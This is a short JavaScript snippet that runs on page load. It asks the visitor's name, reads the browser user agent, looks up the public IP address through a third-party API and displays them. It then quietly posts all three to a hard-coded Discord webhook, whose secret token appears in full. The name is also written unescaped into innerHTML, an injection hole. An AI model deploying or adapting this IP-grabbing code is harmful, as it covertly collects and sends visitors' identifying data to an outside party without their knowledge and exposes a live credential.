async function getDeviceInfo() {
    // Prompt the user for their name
    const userName = prompt("Please enter your name:");

    // Get the device model (user agent)
    const userAgent = navigator.userAgent;

    // Get the IP address using a third-party API
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip;

    // Display the information on the page
    document.getElementById('info').innerHTML = `
        <p><strong>Name:</strong> ${userName}</p>
        <p><strong>Device Model:</strong> ${userAgent}</p>
        <p><strong>IP Address:</strong> ${ipAddress}</p>
    `;

    // Send the information to the Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/1251273027103096953/5gC5-OI1hx3d42KOCGiCAYWMhQ9ai2slEv_xoB57tqlQUSXzF75PBNRX8HTk6419XKL-';
    const data = {
        content: "",
        embeds: [{
            title: "New Visitor Information",
            fields: [
                { name: "Name", value: userName, inline: true },
                { name: "Device Model", value: userAgent, inline: false },
                { name: "IP Address", value: ipAddress, inline: true }
            ]
        }]
    };

    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
}

// Call the function when the page loads
window.onload = getDeviceInfo;
